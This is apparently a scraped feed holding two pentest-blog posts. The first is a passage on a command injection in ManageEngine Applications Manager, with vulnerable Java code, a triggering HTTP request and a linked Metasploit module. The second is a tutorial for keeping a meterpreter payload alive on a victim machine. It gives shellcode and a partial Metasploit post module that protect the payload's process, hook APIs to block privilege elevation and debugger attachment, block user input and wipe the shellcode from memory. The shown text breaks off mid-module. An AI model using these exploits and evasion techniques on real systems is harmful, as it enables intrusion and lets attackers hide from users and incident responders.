dcclass = props.getProperty(\"dcclass\");\n        CustomDCInf amdc = (CustomDCInf)Class.forName(dcclass).newInstance();\n        Properties argsasprops = NewMonitorConf.getValuesforArgs(request, args);\n        authResult = amdc.CheckAuthentication(argsasprops);\n      }\n      response.setContentType(\"text/html; charset=UTF-8\");\n      PrintWriter out = response.getWriter();\n      if (authResult.getProperty(\"authentication\").equalsIgnoreCase(\"passed\"))\n      {\n        String passedMsg = NmsUtil.GetString(\"Passed\");\n        out.println(\"&#60;font color=green&#62;\" + passedMsg + \"&#60;/font&#62;\");\n        out.flush();\n      }\n      else\n      {\n        // ... OMITTED CODE SECTION ...\n      }\n    }\n    catch (NoClassDefFoundError er)\n    {\n      er.printStackTrace();\n      try\n      {\n        if (\"WebsphereMQ\".equals(monType))\n        {\n          // ... OMITTED CODE SECTION ...\n        }\n      }\n      catch (Exception e)\n      {\n        e.printStackTrace();\n      }\n    }\n    catch (Exception ex)\n    {\n      ex.printStackTrace();\n    }\n    return null;\n  }</pre>\n<p>That was the moment I started to think about some attack vectors. After all, this products name is &#8220;Applications Manager&#8221;. It means that this product is able to access servers, applications, databases, etc. etc etc. For this reason, I&#8217;ve decided to checkout the features ofÂ  the product.</p>\n<p>Following screenshot shows a list of product that can be tracked by using Application Manager. I do understand how to fetch information from databases, linux systems but what aboutÂ MS Office SharePoint orÂ Microsoft Lync ? I wouldn&#8217;t directly execute powershell or vbs script but most of the developers don&#8217;t think like <del>me</del> us.</p>\n<p><img class=\"alignnone size-large wp-image-1314\" src=\"https://pentest.blog/wp-content/uploads/supported-features-1024x482.png\" alt=\"\" width=\"648\" height=\"305\" srcset=\"https://pentest.blog/wp-content/uploads/supported-features-1024x482.png 1024w, https://pentest.blog/wp-content/uploads/supported-features-300x141.png 300w, https://pentest.blog/wp-content/uploads/supported-features-768x361.png 768w, https://pentest.blog/wp-content/uploads/supported-features.png 1817w\" sizes=\"(max-width: 648px) 100vw, 648px\" /></p>\n<p>If i truly understand what is happening atÂ <code class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\">NewMonitor</code> class, I could find more realistic attack vectors instead of assumptions.</p>\n<p>After spending multiple hours poking around. I&#8217;ve came across with following class.</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"java\" data-enlighter-highlight=\"7-11,36-45\">public Properties CheckAuthentication(Properties props)\n  {\n    Properties authresult = new Properties();\n    String availmess = null;\n    boolean authentication = false;\n    \n    String host = props.getProperty(\"HostName\");\n    String username = props.getProperty(\"UserName\");\n    String password = props.getProperty(\"Password\");\n    boolean isPowershellEnabled = Boolean.parseBoolean(props.getProperty(\"Powershell\", \"FALSE\"));\n    String authMode = (props.getProperty(\"CredSSP\") != null) &#38;&#38; (props.getProperty(\"CredSSP\").equals(\"Yes\")) ? \"CredSSP\" : \"\";\n    if (!isPowershellEnabled)\n    {\n      WMIDataCollector wl = new WMIDataCollector();\n      String wmiquery = \"Select * from Win32_PerfRawData_PerfOS_Processor where Name='_Total'\";\n      Properties output = wl.getData(host, username, password, wmiquery, new Vector(), \"wmiget.vbs\");\n      if (output.get(\"ErrorMsg\") != null)\n      {\n        if (((String)output.get(\"ErrorMsg\")).indexOf(\"The RPC server is unavailable\") != -1) {\n          availmess = FormatUtil.getString(\"am.webclient.sharepoint.rpcerror.text\");\n        } else if (((String)output.get(\"ErrorMsg\")).indexOf(\"Access is denied\") != -1) {\n          availmess = FormatUtil.getString(\"am.webclient.sharepoint.accessdenied.text\");\n        } else {\n          availmess = (String)output.get(\"ErrorMsg\");\n        }\n      }\n      else {\n        authentication = true;\n      }\n    }\n    else\n    {\n      List&#60;String[]&gt; outputFromScript = null;\n      boolean farmtype = props.getProperty(\"SPType\", \"SPServer\").equalsIgnoreCase(\"Farm\");\n      \n      String psFilePath = System.getProperty(\"user.dir\") + File.separator + \"conf\" + File.separator + \"application\" + File.separator + \"scripts\" + File.separator + \"powershell\" + File.separator + \"TestConnectivity.ps1\";\n      File psFile = new File(psFilePath);\n      password = password.replaceAll(\"'\", \"''\");\n      String scriptToExecute = \"powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden \\\"&#38;{&#38;'\" + psFile.getAbsolutePath() + \"' \" + host + \" \" + username + \" '\" + password + \"'}\\\"\";\n      if (farmtype) {\n        scriptToExecute = \"powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden \\\"&#38;{&#38;'\" + psFile.getAbsolutePath() + \"' \" + host + \" \" + username + \" '\" + password + \"' \" + \"'FarmType' '\" + authMode + \"'}\\\"\";\n      }\n      AMLog.debug(\"SharePointServerDataCollector::resourcename: \" + props.getProperty(\"resourcename\") + \" ,reourceid: \" + props.getProperty(\"resourceid\") + \" ,hostname: \" + props.getProperty(\"HostName\") + \",powershell: \" + props.getProperty(\"PowerShell\") + \" ::scriptToExecute:\" + psFilePath);\n      try\n      {\n        Process proc = Runtime.getRuntime().exec(scriptToExecute);\n        RuntimeProcessStreamReader readerThread = new RuntimeProcessStreamReader(host, scriptToExecute, proc, 300, true, \"inputstream\", true);</pre>\n<p>As you can see host, username and password are being passed to the powershell command without sanitisation. Ofcourse I&#8217;ve trace down from input to here in order to make sure about it.</p>\n<p>Here is the necessary HTTP request to trigger this issue.</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"null\">POST /testCredential.do HTTP/1.1\nHost: 12.0.0.226:9090\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nContent-Length: 595\nConnection: close\n\n&#38;method=testCredentialForConfMonitors&#38;cacheid=1520419442645&#38;type=OfficeSharePointServer&#38;serializedData=url=%2Fjsp%2FnewConfType.jsp&#38;searchOptionValue=&#38;query=&#38;method=createMonitor&#38;addtoha=null&#38;resourceid=&#38;montype=OfficeSharePointServer&#38;isAgentEnabled=NO&#38;resourcename=null&#38;isAgentAssociated=false&#38;hideFieldsForIT360=null&#38;childNodesForWDM=%5B%5D&#38;type=OfficeSharePointServer&#38;displayname=asd&#38;HostName=12.0.0.226&#38;Version=2013&#38;Services=False&#38;Service=False&#38;Powershell=True&#38;CredSSP=False&#38;SPType=SPServer&#38;CredentialDetails=nocm&#38;cmValue=-1&#38;UserName=qwe&#38;Password=qwe&#38;allowEdit=true&#38;pollinterval=5&#38;groupname=</pre>\n<h3>Metasploit Module</h3>\n<p>Here is the metasploit module that exploits this command injection vulnerability.<br />\nPR to the msf master branch (<a href=\"https://github.com/rapid7/metasploit-framework/pull/9684\">https://github.com/rapid7/metasploit-framework/pull/9684</a>)<br />\n<asciinema-player src=\"/wp-content/uploads/manageengine_appmanager_exec.json\" cols=\"150\" rows=\"35\"></asciinema-player></p>\n","descriptionType":"html","publishedDate":"Wed, 07 Mar 2018 20:58:52 +0000","feedId":11893,"bgimg":"https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png","linkMd5":"6f9bfefd47ea932a7405bc89115da85d","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn56@2020_6/2020/08/25/01-41-27-434_818413be4c4fbce7.webp","destWidth":72,"destHeight":72,"sourceBytes":620,"destBytes":1362,"author":"Mehmet Ince","articleImgCdnMap":{"https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn56@2020_6/2020/08/25/01-41-27-434_818413be4c4fbce7.webp","https://pentest.blog/wp-content/uploads/supported-features-1024x482.png":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn28@2020_4/2020/08/25/01-41-47-280_6740d356570561eb.webp"},"publishedOrCreatedDate":1598319687290},{"createdTime":"2020-08-25 09:41:27","updatedTime":"2020-08-25 09:41:27","title":"Art of Anti Detection 4 – Self-Defense","link":"https://pentest.blog/?p=1631","description":"\n<p>Throughout the Art of Anti Detection series we have mainly looked at methods for bypassing automated security products, but in this part  we will focus on several self-defense methods for protecting our foothold on the target machines against actual users. These users may be technically insufficient employees or they may be blue team members in a cyber incident division of a company.  Our goal is to stay alive and hide our presence inside the target system without having any privileges. But before getting deeper i advise you to read the <a href=\"https://pentest.blog/art-of-anti-detection-3-shellcode-alchemy/\">previous articles</a> of this series, because these methods will include a lot of shellcoding and API hooking thus requires prior knowledge. Now lets get to it ! </p>\n\n\n\n<span id=\"more-1631\"></span>\n\n\n\n<p>Since we are generally using meterpreter for infiltrating systems our main goal will be constructing a post exploitation module for Metasploit. Once activated, our module should be able to protect the process containing our meterpreter payload against users interventions. Also while designing this module we will implement these self defense methods in both x86 and x64 shellcode form, this will allow us to deploy this self defense mechanism into other running processes. For starters we need to think about how can a user disrupt our session on the target system. The first obvious action is terminating the unknown/suspicious processes with several built-in tools. Our first trick will be about preventing the process termination. Thru out this article we will assume our meterpreter session has the same privileges with the user. Because this is the most likely scenario inside a corporate network. Majority of the user accounts of a company donâ€™t have administrative privileges. We will try to use this as a advantage by abusing certain logic inside Windows. So this module should be able to work without escalating privileges. Because of the major difference in Windows user account controls (UAC) we will consider different strategies for different Windows versions. </p>\n\n\n\n<h2>Protect Process</h2>\n\n\n\n<p>The first trick will be targeting Windows versions 7 and before. Despite being 10 years old Windows 7 is still being used heavily around the world.  Inside these versions non-admin users are able to create protected processes, this causes a weird situation where a user creates a process that can not be terminated by the creator. When a process is protected only administrator users can manipulate it. When a non-admin user tries to terminate a protected process following error pops up, </p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://pentest.blog/wp-content/uploads/Peek-2019-07-04-12-38.gif\" alt=\"\" class=\"wp-image-2173\"/></figure>\n\n\n\n<p>Also this is not just for process termination all actions regarding opening a handle to the protected process is prohibited. In order to protect a process we need to set a special security descriptor. According to MSDN security descriptor structure contains the security information associated with an object. Such as;</p>\n\n\n\n<ul><li>An owner&#160;<a href=\"https://docs.microsoft.com/windows/desktop/SecGloss/s-gly\">security identifier</a>&#160;(SID)</li><li>A primary group SID</li><li>A&#160;<a href=\"https://docs.microsoft.com/windows/desktop/SecGloss/d-gly\">discretionary access control list</a>&#160;(DACL)</li><li>A&#160;<a href=\"https://docs.microsoft.com/windows/desktop/SecGloss/s-gly\">system access control list</a>&#160;(SACL)</li><li>Qualifiers for the preceding items</li></ul>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"cpp\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">typedef struct _SECURITY_DESCRIPTOR {\n  BYTE                        Revision;\n  BYTE                        Sbz1;\n  SECURITY_DESCRIPTOR_CONTROL Control;\n  PSID                        Owner;\n  PSID                        Group;\n  PACL                        Sacl;\n  PACL                        Dacl;\n} SECURITY_DESCRIPTOR, *PISECURITY_DESCRIPTOR;</pre>\n\n\n\n<p>These structures can be represented with <a href=\"https://docs.microsoft.com/tr-tr/windows/desktop/SecAuthZ/security-descriptor-string-format\">Security Descriptor String Format</a> which is a text format for storing or transporting information in a security descriptor. The format is a&#160;null-terminated string with tokens to indicate each of the four main components of a security descriptor: owner (O:), primary group (G:), DACL (D:), and SACL (S:). </p>\n\n\n\n<pre class=\"wp-block-code\"><code>O:owner_sid\nG:group_sid\nD:dacl_flags(string_ace1)(string_ace2)... (string_acen)\nS:sacl_flags(string_ace1)(string_ace2)... (string_acen)</code></pre>\n\n\n\n<p>For protecting a process we need to set &#8220;<strong>D:P</strong>&#8221; witch corresponds as setting the <strong>SE_DACL_PROTECTED</strong> flag. In order to set such flags inside the SECURITY_DESCRIPTOR of a process we need to use particular Windows API functions. First we need to convert the string security descriptor format to a proper security descriptor structure. In order to do this we will call the <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/sddl/nf-sddl-convertstringsecuritydescriptortosecuritydescriptora\">ConvertStringSecurityDescriptorToSecurityDescriptorA</a> function. This function takes the following parameters.</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"cpp\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">BOOL ConvertStringSecurityDescriptorToSecurityDescriptorA(\n  LPCSTR               StringSecurityDescriptor,\n  DWORD                StringSDRevision,\n  PSECURITY_DESCRIPTOR *SecurityDescriptor,\n  PULONG               SecurityDescriptorSize\n);</pre>\n\n\n\n<p>As shown above there needs to be a already declared security descriptor structure for setting the new one. We will first declare a SECURITY_ATTRIBUTES structure witch will contain  our SECURITY_DESCRIPTOR. </p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"cpp\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">SECURITY_ATTRIBUTES sa;\nTCHAR * szSD = TEXT(\"D:P\");\nsa.nLength = sizeof(SECURITY_ATTRIBUTES);\nsa.bInheritHandle = FALSE;\n\nConvertStringSecurityDescriptorToSecurityDescriptor(szSD,SDDL_REVISION_1, &#38;(sa.lpSecurityDescriptor)</pre>\n\n\n\n<p>After converting the string security descriptor into the SECURITY_ATTRIBUTES structure now we need to get the process handle that we want to protect. </p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"cpp\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());</pre>\n\n\n\n<p>And finally we will call the <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-setkernelobjectsecurity\">SetKernelObjectSecurity</a> , this function sets the security of a kernel object. After setting the prepared security descriptor our process finally be safe from savage users  <img src=\"https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f609.png\" alt=\"ðŸ˜‰\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" />  Now we need to convert this series of API calls to shellcode. Besides the creation of a SECURITY_ATTRIBUTES structure there is nothing tricky about this. We will perform total of 4 API calls with at most 4 parameter. Based on our shellcoding article it should be no problem constructing such shellcodes. Only tricky part is the creation of SECURITY_ATTRIBUTES structure because you need to calculate the total size of the structure in bytes and replicate the  values stored inside upon first creation. For making things easier compile the code written in C and then use a debugger to inspect the SECURITY_ATTRIBUTES structure. </p>\n\n\n\n<figure class=\"wp-block-image\"><img src=\"https://pentest.blog/wp-content/uploads/screenshot_4-1024x442.png\" alt=\"\" class=\"wp-image-2160\" srcset=\"https://pentest.blog/wp-content/uploads/screenshot_4-1024x442.png 1024w, https://pentest.blog/wp-content/uploads/screenshot_4-300x130.png 300w, https://pentest.blog/wp-content/uploads/screenshot_4-768x332.png 768w, https://pentest.blog/wp-content/uploads/screenshot_4.png 1913w\" sizes=\"(max-width: 1024px) 100vw, 1024px\" /></figure>\n\n\n\n<p>In x86 systems this structure is 12 bytes long, at x64 systems this size doubles. Resulting assembly code should be looking like this;</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"asm\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">; x86 ConvertStringSecurityDescriptorToSecurityDescriptor call\n    push 0x00503a44            ; \"D:P\"\n    sub esp,4                  ; Push the address of \"D:P\" string to stack\n    push 0x00000000            ; FALSE\n    lea eax, [esp+4]           ; Load the address of 4 byte buffer to EAX\n    push eax                   ; Push the 4 byte buffer address\n    push 0x00000001            ; SDDL_REVISION_1 \n    lea eax, [esp+16]          ; Load the address of \"D:P\" string to EAX\n    push eax                   ; Push the EAX value\n    push 0xDA6F639A            ; hash(advapi32.dll, ConvertStringSecurityDescriptorToSecurityDescriptor)\n    call ebp                   ; ConvertStringSecurityDescriptorToSecurityDescriptor(\"D:P\",SDDL_REVISION_1,FALSE) </pre>\n\n\n\n<p>Rest of the shellcoding should be easier. There is one more tiny detail that we need to consider. We are going to use the <a href=\"https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Post/Windows/Process:execute_shellcode\">execute_shellcode</a> function of Metasploit framework. This function simply injects shellcode to a process, and executes it by opening a remote thread. After the execution our shellcode needs to call the appropriate functions for terminating the thread properly. This means we need to append the <a href=\"https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_exitfunk.asm\">block_exitfunk.asm</a> code at the end of all our shellcodes.  This block determines the current windows version and calls the appropriate exit functions accordingly.</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"asm\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">[BITS 64]\n\nexitfunk:\n  mov ebx, 0x0A2A1DE0   ; The EXITFUNK as specified by user...\n  mov r10d, 0x9DBD95A6  ; hash( \"kernel32.dll\", \"GetVersion\" )\n  call rbp              ; GetVersion(); (AL will = major version and AH will = minor version)\n  add rsp, 40           ; cleanup the default param space on stack\n  cmp al, byte 6        ; If we are not running on Windows Vista, 2008 or 7\n  jl short goodbye      ; Then just call the exit function...\n  cmp bl, 0xE0          ; If we are trying a call to kernel32.dll!ExitThread on Windows Vista, 2008 or 7...\n  jne short goodbye     ;\n  mov ebx, 0x6F721347   ; Then we substitute the EXITFUNK to that of ntdll.dll!RtlExitUserThread\ngoodbye:                ; We now perform the actual call to the exit function\n  push byte 0           ;\n  pop rcx               ; set the exit function parameter\n  mov r10d, ebx         ; place the correct EXITFUNK into r10d\n  call rbp              ; call EXITFUNK( 0 );</pre>\n\n\n\n<p> Here is the complete <a href=\"https://github.com/EgeBalci/SelfDefense/blob/master/x86/ProtectProcess/protect_process.asm\">x86</a> and <a href=\"https://github.com/EgeBalci/SelfDefense/blob/master/x64/ProtectProcess/protect_process.asm\">x64</a> shellcodes for this method. But this method only solves the half of our process termination problems. Users with administrative privileges can still terminate protected processes with running process termination tools as admin. Thus our second trick should be preventing UAC elevation for users.</p>\n\n\n\n<h2>Prevent Elevation</h2>\n\n\n\n<p>In order to prevent elevation of privileges we need to understand how can a process acquire certain privileges. When a process needs to perform some task witch requires special privileges it needs to have the appropriate access token. Terminating or opening a handle to a protected process also requires certain tokens.  There are several ways to obtain these access tokens, almost all of them includes the use of following two API functions;</p>\n\n\n\n<p>First one is <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges\">AdjustTokenPrivileges</a>, This function enables or disables privileges in the specified access token. Almost all of the privileged operations witch requires token manipulation uses this API function.</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"cpp\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">BOOL AdjustTokenPrivileges(\n  HANDLE            TokenHandle,\n  BOOL              DisableAllPrivileges,\n  PTOKEN_PRIVILEGES NewState,\n  DWORD             BufferLength,\n  PTOKEN_PRIVILEGES PreviousState,\n  PDWORD            ReturnLength\n);</pre>\n\n\n\n<p>Second important function is <a href=\"https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/nf-wdm-rtlsetdaclsecuritydescriptor\">RtlSetDaclSecurityDescriptor</a>, this function sets the DACL information of an absolute-format security descriptor, or if there is already a DACL present in the security descriptor, it is superseded.</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"cpp\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">NTSYSAPI NTSTATUS RtlSetDaclSecurityDescriptor(\n  PSECURITY_DESCRIPTOR SecurityDescriptor,\n  BOOLEAN              DaclPresent,\n  PACL                 Dacl,\n  BOOLEAN              DaclDefaulted\n);</pre>\n\n\n\n<p>In theory if we could find a way to disable those two functions inside a process it simply can&#8217;t change its token privileges thus can&#8217;t perform privileged operations. In order to disable those two functions inside a remote process we need to use inline API hooking. The reason we are using inline hooking is because of our targets are mainly going to be  the system processes such as task manager. Instead of using the function addresses inside the import address table those system binaries dynamically load the required API functions in run-time.  Thus patching the IAT entries (IAT hooking) will not work for us, we need to be able to redirect or patch those functions directly. In order to achieve this we need to use a <a href=\"https://github.com/EgeBalci/Hook_API\">inline hook assembly block</a>. This block patches the first couple of bytes of the function prologue allowing us to redirect the function elsewhere or return any value. In our case we need it to return true. While assembling this block it requires a binary file called <strong>patch</strong> which is containing the assembled instruction that will be written to the beginning of the function. For returning true from these functions following instructions should be placed;</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"asm\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">; x64 return 0\ndb 0x48,0x31,0xc0    ; xor rax,rax\ndb 0xc3              ; ret\n\n; x86 return 0\ndb 0x32,0xc0         ; xor eax,eax\ndb 0xc3              ; ret</pre>\n\n\n\n<p>Now this block will patch the function with the given hash and make it return zero. Once this shellcode executed inside a process any token elevation attempts will return false thus the process will not be able to escalate privileges. </p>\n\n\n\n<h2>BlockInput</h2>\n\n\n\n<p>This one is a minor detail. Our meterpreter payload may be running inside a application with a graphical user interface, this can mean there may be  several buttons for terminating the application. With calling the <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-blockinput\">BlockInput</a> API function we will prevent all keyboard and mouse input events from reaching the application that is hosting our payload.</p>\n\n\n\n<h2>Self Removal</h2>\n\n\n\n<p>This is one of the most important issues for developing this module. I didn&#8217;t specify any particular method for calling API functions, it can be done in several ways but the easier way is to use the Metasploit block API.  But using the block API has a high change of getting detected by security products. While trying to maintain our presence and stay alive we also need to remove all suspicious shellcode from the memory especially the block API. So after we finish protecting our process and hooking others, we need to setup a prologue that will wipe the shellcode from the memory.  But this task is a bit tricky because in order to terminate our thread we need to call the appropriate API function. And to call functions we also need the block API. This situation forces us to first gather the required termination function address then wipe the shellcode from memory. Resulting shellcode should look like this;</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"asm\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">    push 0x0000006c                 ; 0x00,l\n    push 0x6c642e6c                 ; ld.l\n    push 0x6c64746e                 ; ldtn\n    push esp                        ; &#38;\"ntdll.dll\"\n    push 0x0726774C                 ; hash(\"KERNEL32.dll\", \"LoadLibraryA\")\n    call ebp                        ; LoadLibraryA(\"ntdll.dll\")\n    push 0x00000064                 ; 0x00,d\n    push 0x61657268                 ; aerh\n    push 0x54726573                 ; Tres\n    push 0x55746978                 ; Utix\n    push 0x456c7452                 ; EltR\n    push esp                        ; &#38;\"RtlExitUserThread\"\n    push eax                        ; HANDLE (KERNEL32.dll)\n    push 0x7802F749                 ; hash(\"KERNEL32.dll\", \"GetProcAddress\")\n    call ebp                        ; GetProcAddress(HANDLE, \"RtlExitUserThread\")\n    mov ebp,eax                     ; Save the RtlExitUserThread address to EDI\n    ; PEB manipulation\n    xor eax,eax                     ; Zero EAX (upper 3 bytes will remain zero until function is found)\n    mov ebx,[fs:eax+0x30]           ; Get a pointer to the PEB\n    mov ebx,[ebx+0x0C]              ; Get PEB->Ldr  \n    mov eax,[ebx + 0x0C]            ; InOrderModuleList\n    mov dword [eax+0x20],0xFFFFFF   ; SizeOfImage\n    ; Wipe self defense shellcode\ntotal_size: equ $-self_defense      ; Set the size of the self defense shellcode to total_size label\n    mov ecx,total_size              ; Move the total size of the self defense shellcode to ECX\n    call $+5\n    pop eax\nclean:\n    mov byte [eax],0x00             ; Wipe 1 byte\n    dec eax                         ; Increase index\n    loop clean                      ; Loop until all shellcode cleared from memory\n    push 0x00                       ; NULL              \n    call ebp                        ; RtlExitUserThread(0)\n</pre>\n\n\n\n<p>For some security products removing the shellcode from memory might not be enough. Designing a metamorphic encoder schema can also be very helpful. I will not include the encoding part in this article for keeping it short.  After writing the self removal prologue now we merge all of them together and the final <a href=\"https://github.com/EgeBalci/SelfDefense/blob/master/x86/self_defense.asm\">x86</a> and <a href=\"https://github.com/EgeBalci/SelfDefense/blob/master/x64/self_defense.asm\">x64</a> self defense shellcodes are ready for action. Before continuing to the Metasploit module we also need a solution for Windows versions where our process protection trick don&#8217;t work.</p>\n\n\n\n<h2>Prevent Termination</h2>\n\n\n\n<p>Without our protected processes Windows 8/10 users can directly terminate our sessions. What can be done in such situations ? After little thinking the obvious answer comes into mind, MORE HOOKING <img src=\"https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f600.png\" alt=\"ðŸ˜€\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /> We can simply disable all process termination APIs  inside all programs that are capable of terminating a process.  But we also need to protect our payload from being analysed.  Debuggers and any kind of monitoring tools also shouldn&#8217;t be able to attach to our process.  All those can be achieved with hooking the <a href=\"https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess\">OpenProcess</a> API. Because of  OpenProcess being a very fundamental function the process we inject will be crippled in several ways. Some programs crashes once OpenProcess call fails.  This can be done in a more safe and stealthy way. I chose this because of laziness <img src=\"https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png\" alt=\"ðŸ™‚\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" />  However this solves our process termination problem. We can use the previous hook shellcode for this. Only thing that needs to be changed is the function hashes that are passed to the inline hook block. After adding this our shellcoding phase ends.</p>\n\n\n\n<h2>Metasploit Module</h2>\n\n\n\n<p>Now we need to construct the MSF post module that will inject our shellcodes into appropriate processes.  Lets start by choosing a post exploit module template to work on. Our module will not take any mandatory parameter.  There will be two optional parameters called PID and LOOP. This module should be able to protect other processes that are not hosting our meterpreter payload. PID parameter will specify the process ID to inject our shellcodes. And LOOP parameter will specify if the module runs continuously.   Following template sets the required post exploit class and metadata. </p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"ruby\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">class MetasploitModule &#60; Msf::Post\n\n  include Msf::Post::File\n  include Msf::Post::Windows::Process\n\n  def initialize(info = {})\n    super(update_info(info,\n        'Name'          => 'Process Protector',\n        'Description'   => %q{\n          This module will protect the given process with injecting special shellcodes and disabling key API functions using inline hooking.\n        },\n        'License'       => MSF_LICENSE,\n        'Author'        => [ 'Ege BalcÄ±' ],\n        'Platform'      => [ 'win'],\n        'SessionTypes'  => [ 'meterpreter']\n    ))\n        \n    register_options([\n      OptString.new('PID', [false, 'The target process ID for the UAC elevation.' ]),\n      OptBool.new('LOOP', [false, 'Continiously check running processes for elevation prevention.' ]),\n    ])\n\n  end\nend</pre>\n\n\n\n<p> After declaring the initial metadata and classes now we will construct the run method. First we need to check whether the session is a meterpreter session. </p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"ruby\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">    # Make sure we meet the requirements before running the script, note no need to return\n    # unless error\n    return 0 if session.type != \"meterpreter\"</pre>\n\n\n\n<p>After checking the session type now we&#8217;ll check if a special PID value is specified. If not this module should target the process containing our meterpreter session.  We can do this with following simple check, every post module in Metasploit has a <a href=\"https://www.rubydoc.info/github/rapid7/metasploit-framework/Rex/Post/Meterpreter/Client\">client</a> class. According to ruby documentations this class provides an interface that is compatible with the Rex post-exploitation interface in terms of the feature set that it attempts to expose. This class is meant to drive a single meterpreter client session. By calling <strong>client.sys.process.getpid</strong> we can acquire the current process ID of the process holding our session.</p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"ruby\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">    if datastore['PID'].to_s == ''\n      pid = client.sys.process.getpid.to_i\n    else\n      pid = datastore['PID'].to_i\n    end</pre>\n\n\n\n<p>For not repeating the use of block API in out shellcodes we will declare once and  use them in all shellcodes. Actually Metasploit already has a mechanism for generating block_api.asm built inside.  But because of laziness i directly declared the assembled block_api.asm inside the module. </p>\n\n\n\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"ruby\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">    # https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm\n    block_api_32 = \"\"\n    block_api_32 &#60;&#60; \"\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\\x50\\x30\\x8b\\x52\\x0c\"\n    # SNIP ...\n    block_api_32 &#60;&#60; 